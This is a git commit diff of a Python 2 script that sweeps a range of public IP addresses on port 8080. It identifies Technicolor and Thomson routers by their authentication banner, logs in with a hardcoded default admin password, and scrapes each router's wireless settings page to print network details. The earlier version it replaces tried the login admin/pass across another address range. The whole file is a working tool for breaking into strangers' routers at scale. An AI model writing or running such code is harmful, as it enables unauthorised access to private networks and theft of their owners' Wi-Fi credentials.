283ba9dccfc0b0d7c570b34bc5042116e6130a58
Eliseo Torres <eliseo.torres95@gmail.com>
2016-06-08 07:06:47 -0500

    Update eliseo_ip.py

--- eliseo_ip.py
+++ eliseo_ip.py
@@ -1,24 +1,39 @@
+# -*- coding: utf-8 -*-
 import requests
 from requests.auth import HTTPBasicAuth
+from bs4 import BeautifulSoup
 import json
-ip="186.146.166."
-count=0
-#file=open("rom-0.txt", "w")
+ip="181.63.179."
+tech=0
+tom=0
 for i in range(0,256):
     try:
-        #print "En proceso "+ip+str(i)
         r1=requests.get('http://'+ip+str(i)+':8080/', timeout=0.3)
-        a=r1.status_code
-        code=str(a)
-        if code!="200":
-            r=requests.get('http://'+ip+str(i)+':8080/', auth=HTTPBasicAuth('admin', 'pass'), timeout=0.3)
-            b=r.status_code
-            code1=str(b)
-            if code1=='200':
-                count=count+1
-                print ip+str(i)+".................login ok"
+        head=r1.headers
+        b='WWW-Authenticate' in head
+        if b==True:
+            r=requests.get('http://'+ip+str(i)+':8080/', timeout=0.3)
+            n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
+            if n==True: ##Technicolor
+                tech=tech+1
+                print ip+str(i)+"..................Technicolor.........."
+                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
+                parser1=r2.content
+                bs1=BeautifulSoup(parser1, "html.parser")
+                for td in bs1.find_all("td", align="middle"):
+                    print ip+str(i)+"..................Technicolor.........."+td.text[16:]
+            else: ##Thomson
+                tom=tom+1
+                print ip+str(i)+"..................Thomson....."
+                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
+                parser=r2.content
+                bs=BeautifulSoup(parser, "html.parser")
+                for td in bs.find_all("td", align="middle"):
+                    print ip+str(i)+"..................Thomson....."+td.text[16:]
+                
+           
+                
             
-        #file.write(ip+str(i))
     except requests.exceptions.ConnectTimeout:
         pass
     except requests.exceptions.ReadTimeout:
@@ -27,7 +42,9 @@ for i in range(0,256):
         pass
     except KeyError:
         pass
-print "Login ok en "+str(count)+" hosts"
-    
+#print "Se ha logrado logear en "+str(count)+" hosts"
+print str(tech)+" technicolor"
+print str(tom)+" tomson"
+print str(tech+tom)+" En total"
     
 	
